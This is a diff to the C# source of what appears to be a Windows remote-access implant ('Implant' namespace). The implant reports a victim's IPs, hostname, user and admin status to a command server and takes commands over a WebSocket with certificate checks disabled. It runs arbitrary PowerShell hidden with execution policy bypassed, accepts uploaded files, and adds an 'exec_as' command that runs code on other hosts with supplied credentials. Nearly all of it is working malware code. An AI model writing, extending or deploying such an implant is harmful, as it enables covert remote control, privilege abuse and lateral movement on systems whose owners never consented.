@@ -1,7 +1,4 @@
-﻿using Microsoft.Win32;
-using Newtonsoft.Json;
-using Newtonsoft.Json.Linq;
-using System;
+﻿using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -12,11 +9,15 @@ using System.Net.Http;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Net.WebSockets;
+using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Security.Principal;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Reflection;
+using Microsoft.Win32;
+using Newtonsoft.Json;
+using Newtonsoft.Json.Linq;
 
 
 namespace Implant
@@ -82,13 +83,13 @@ namespace Implant
             (sender, certificate, chain, sslPolicyErrors) => true;
 
             _ws = new ClientWebSocket();
+            var uri = new Uri($"ws://{_base_url}?id={_implId}-root={GetRoot()}-user={Environment.UserName}");
 
-            var uri = new Uri($"ws://{_base_url}?id={_implId}");
+
 
             try
             {
 
-                
                 await _ws.ConnectAsync(uri, _wsCancellationTokenSource.Token);
 
                 while (_running && _ws.State == WebSocketState.Open)
@@ -103,6 +104,35 @@ namespace Implant
             catch (Exception ex)
             {
 
+            }
+        }
+
+
+        public async Task CloseWebSocketAsync()
+        {
+            try
+            {
+                _wsCancellationTokenSource?.Cancel();
+                
+                if (_ws != null && _ws.State == WebSocketState.Open)
+                {
+                    await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure, 
+                                        "Client closing", 
+                                        CancellationToken.None);
+                }
+            }
+            catch (WebSocketException ex)
+            {
+            }
+            catch (Exception ex)
+            {
+            }
+            finally
+            {
+                _ws?.Dispose();
+                _wsCancellationTokenSource?.Dispose();
+                _ws = null;
+                _running = false;
             }
         }
 
@@ -167,6 +197,10 @@ namespace Implant
                 {
                     await StopAttack(data["stop_attack"].ToString());
                 }
+                else if (data.ContainsKey("finish"))
+                {
+                    await ExitWs();
+                }
             }
             catch (Exception e)
             {
@@ -174,35 +208,7 @@ namespace Implant
             }
         }
 
-        private async Task WriteAllBytesAsync(string path, byte[] bytes)
-        {
-            using (var fileStream = new FileStream(
-                path,
-                FileMode.Create,
-                FileAccess.Write,
-                FileShare.None,
-                bufferSize: 4096,
-                useAsync: true))
-            {
-                await fileStream.WriteAsync(bytes, 0, bytes.Length);
-            }
-        }
 
-        private async Task<byte[]> ReadAllBytesAsync(string path)
-        {
-            using (var fileStream = new FileStream(
-                path,
-                FileMode.Open,
-                FileAccess.Read,
-                FileShare.Read,
-                bufferSize: 4096,
-                useAsync: true))
-            {
-                var bytes = new byte[fileStream.Length];
-                await fileStream.ReadAsync(bytes, 0, (int)fileStream.Length);
-                return bytes;
-            }
-        }
 
         private async Task ExecuteCommand(string command)
         {
@@ -212,42 +218,223 @@ namespace Implant
             {
                 await ChangeDirectory(command.Substring(3).Trim());
             }
-            else
+            else if (command.StartsWith("runas"))
             {
-                var result = ExecuteShellCommand(command);
+                // Mensaje de error para runas
                 await SendResponse(new
                 {
-                    result = result.output,
-                    error = result.error,
+                    result = "Runas command is not properly. Use: 'exec_as <user> <password> <host (localhost by default)> <command>' instead.",
+                    cwd = _currentDir
+                });
+            }
+            else if (command.StartsWith("exec_as "))
+            {
+                await ExecuteAsUser(command.Substring(8).Trim());
+            }
+            else
+            {
+                var result = await ExecuteShellCommandAsync(command);
+                await SendResponse(new
+                {
+                    result = !string.IsNullOrEmpty(result.output) ? result.output : result.error,
                     cwd = _currentDir
                 });
             }
         }
 
-        private (string output, string error) ExecuteShellCommand(string command)
+
+
+        private async Task ExecuteAsUser(string commandWithCredentials)
         {
             try
             {
+                var username = "";
+                var password = "";
+                var host = "localhost";
+                var actualCommand = "";
+
+                var parts = commandWithCredentials.Split(new char[] { ' ' }, 3);
+                if (parts.Length < 3 || parts.Length > 4)
+                {
+                    await SendResponse(new
+                    {
+                        result = "Error: Wrong format. Use: exec_as <user> <password> <host (localhost by default)> <command>",
+                        cwd = _currentDir
+                    });
+                    return;
+                }
+
+                if (parts.Length == 3)
+                {
+                    username = parts[0];
+                    password = parts[1];
+                    actualCommand = parts[2];
+                }
+                if (parts.Length == 4)
+                {
+                    username = parts[0];
+                    password = parts[1];
+                    host = parts[2];
+                    actualCommand = parts[3];
+                }
+
+                var domain = Environment.UserDomainName;
+
+                var result = await ExecutePowerShellAsUser(actualCommand, username, domain, password);
+
+                await SendResponse(new
+                {
+                    result = result,
+                    cwd = _currentDir,
+                    executedAs = $"{domain}\\{username}"
+                });
+            }
+            catch (Exception ex)
+            {
+                await SendResponse(new
+                {
+                    result = $"Error: {ex.Message}",
+                    cwd = _currentDir
+                });
+            }
+        }
+
+
+
+        private async Task<string> ExecutePowerShellAsUser(string command, string username, string domain, string password, string host = "localhost")
+        {
+            try
+            {
+                string escapedPassword = password.Replace("'", "''");
+
+                string currentExe = Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName);
+
+                string psScript = $@"
+                  $securePassword = ConvertTo-SecureString '{escapedPassword}' -AsPlainText -Force
+                  $credential = New-Object System.Management.Automation.PSCredential('{domain}\{username}', $securePassword)
+
+                  try {{
+                      $result = Invoke-Command -ComputerName {host} -Credential $credential -ScriptBlock {{
+                          Set-Location $args[1]
+
+                          if ($args[0] -match '\.(exe|com|bat|cmd|msi)$' -or $args[0] -match '^(calc|notepad|mspaint|winword|excel|powerpnt)') {{
+                              & $args[0] 2>&1 | Out-String
+                          }}
+                          else {{
+                              Invoke-Expression $args[0] 2>&1 | Out-String
+                          }}
+                      }} -ArgumentList '{command}', '{_currentDir}' -ErrorAction Stop
+
+                      Write-Output ""$result""
+                  }}
+                  catch {{
+                      Write-Output ""ERROR:$($_.Exception.Message)""
+                  }}
+                  ";
+
                 var process = new Process
                 {
                     StartInfo = new ProcessStartInfo
                     {
                         FileName = "powershell.exe",
-                        Arguments = $"/c {command}",
+                        Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{psScript}\"",
                         WorkingDirectory = _currentDir,
                         RedirectStandardOutput = true,
                         RedirectStandardError = true,
                         UseShellExecute = false,
                         CreateNoWindow = true
-                    }
+                    },
+                    EnableRaisingEvents = true
+                };
+
+                if (command.IndexOf(currentExe, StringComparison.OrdinalIgnoreCase) >= 0)
+                {
+                    process.StartInfo.RedirectStandardOutput = false;
+                    process.StartInfo.RedirectStandardError = false;
+
+                    process.Start();
+                    return $"Process {process.Id} started in background (command matched {currentExe}).";
+                }
+
+                var outputBuilder = new StringBuilder();
+                var errorBuilder = new StringBuilder();
+                var tcs = new TaskCompletionSource<string>();
+
+                process.OutputDataReceived += (s, e) =>
+                {
+                    if (e.Data != null)
+                        outputBuilder.AppendLine(e.Data);
+                };
+
+                process.ErrorDataReceived += (s, e) =>
+                {
+                    if (e.Data != null)
+                        errorBuilder.AppendLine(e.Data);
+                };
+
+                process.Exited += (s, e) =>
+                {
+                    if (errorBuilder.Length > 0)
+                        tcs.TrySetResult("ERROR: " + errorBuilder.ToString());
+                    else
+                        tcs.TrySetResult(outputBuilder.ToString());
+
+                    process.Dispose();
                 };
 
                 process.Start();
-                var output = process.StandardOutput.ReadToEnd();
-                var error = process.StandardError.ReadToEnd();
-                process.WaitForExit();
+                process.BeginOutputReadLine();
+                process.BeginErrorReadLine();
 
-                return (output, error);
+                return await tcs.Task;
+            }
+            catch (Exception ex)
+            {
+                return $"Error ejecutando comando: {ex.Message}";
+            }
+        }
+
+
+
+
+        private async Task<(string output, string error)> ExecuteShellCommandAsync(string command)
+        {
+            try
+            {
+                string escapedCommand = command.Replace("'", "''").Replace("\"", "\\\"");
+                var process = new Process
+                {
+                    StartInfo = new ProcessStartInfo
+                    {
+                        FileName = "powershell.exe",
+                        Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{escapedCommand}\"",
+                        WorkingDirectory = _currentDir,
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        UseShellExecute = false,
+                        CreateNoWindow = true
+                    },
+                    EnableRaisingEvents = true
+                };
+
+                var outputBuilder = new StringBuilder();
+                var errorBuilder = new StringBuilder();
+                var tcs = new TaskCompletionSource<(string, string)>();
+
+                process.OutputDataReceived += (s, e) => { if (e.Data != null) outputBuilder.AppendLine(e.Data); };
+                process.ErrorDataReceived += (s, e) => { if (e.Data != null) errorBuilder.AppendLine(e.Data); };
+
+                process.Exited += (s, e) =>
+                {
+                    tcs.TrySetResult((outputBuilder.ToString(), errorBuilder.ToString()));
+                    process.Dispose();
+                };
+
+                process.Start();
+                process.BeginOutputReadLine();
+                process.BeginErrorReadLine();
+
+                return await tcs.Task;
             }
             catch (Exception ex)
             {
@@ -297,15 +484,12 @@ namespace Implant
         {
             try
             {
-                // Decodificamos el chunk Base64
                 var part = Convert.FromBase64String(chunkData["data"].ToString());
                 var isLast = chunkData.ContainsKey("last") && (bool)chunkData["last"];
 
-                // Añadimos el chunk al buffer
                 _uploadBuffer.Add(part);
 
 
-                // Asignamos la ruta de destino solo una vez
                 if (_uploadDestination == null)
                 {
                     _uploadDestination = destination;
@@ -313,7 +497,6 @@ namespace Implant
 
 
 
-                // Si es el último chunk, escribimos el archivo
                 if (isLast)
                 {
                     using (var fs = new FileStream(_uploadDestination, FileMode.Create, FileAccess.Write))
@@ -325,7 +508,6 @@ namespace Implant
                     }
 
 
-                    // Limpiamos
                     _uploadBuffer.Clear();
                     _uploadDestination = null;
 
@@ -707,6 +889,13 @@ namespace Implant
             catch { }
         }
 
+        private async Task ExitWs()
+        {
+            CloseWebSocketAsync();
+            Environment.Exit(0);
+
+        }
+
         private async Task Register()
         {
             try
@@ -718,13 +907,14 @@ namespace Implant
                     public_ip = GetPublicIp(),
                     local_ip = GetLocalIps(),
                     operating_system = GetOperatingSystem(),
-                    impl_id = _implId,
+                    impl_id = $"{_implId}-root={GetRoot()}-user={Environment.UserName}",
                     hostname = Environment.MachineName,
+                    root = GetRoot(),
                     user = Environment.UserName
                 };
                 System.Net.ServicePointManager.ServerCertificateValidationCallback +=
                 (sender, cert, chain, sslPolicyErrors) => true;
-                
+
                 using (var client = new HttpClient())
                 {
                     var content = new StringContent(JsonConvert.SerializeObject(model), Encoding.UTF8, "application/json");
@@ -863,6 +1053,15 @@ namespace Implant
             }
         }
 
+        public bool GetRoot()
+        {
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
+
+
         private async Task SendResponse(object response)
         {
             if (_ws != null && _ws.State == WebSocketState.Open)
@@ -881,41 +1080,13 @@ namespace Implant
 
            try
             {
+                string url = "localhost";
+                string group = "grupo";
 
-
-                string rutaCompleta = Assembly.GetExecutingAssembly().Location;
-                string nombreArchivo = Path.GetFileName(rutaCompleta);
-
-
-                byte[] datos = File.ReadAllBytes(rutaCompleta);
-
-                // Buscar los últimos 1000 bytes
-                int bytesParaLeer = Math.Min(1000, datos.Length);
-                byte[] finalBytes = new byte[bytesParaLeer];
-                Array.Copy(datos, datos.Length - bytesParaLeer, finalBytes, 0, bytesParaLeer);
-
-                // Primera decodificación de 
-                string texto = Encoding.Unicode.GetString(finalBytes); // Unicode = UTF-16 LE en .NET
-
-                string[] raw_data = texto.Split(new string[] { "DATA=" }, StringSplitOptions.None);
-
-                string base64_data = raw_data[1];
-                byte[] base64Bytes = Convert.FromBase64String(base64_data);
-                string decode_data = Encoding.UTF8.GetString(base64Bytes);
-
-                // Data decodificada utf-16-le --> base64 --> string with data
-
-                string[] data = decode_data.Split('|');
-
-                string url = data[1];
-                string port = data[2];
-                string group = data[3];
-
-
+                int port = 4444;
 
                 var implant = new Implant( group, $"{url}:{port}");
                 await implant.Run();
-
             }
             catch (Exception ex)
             {
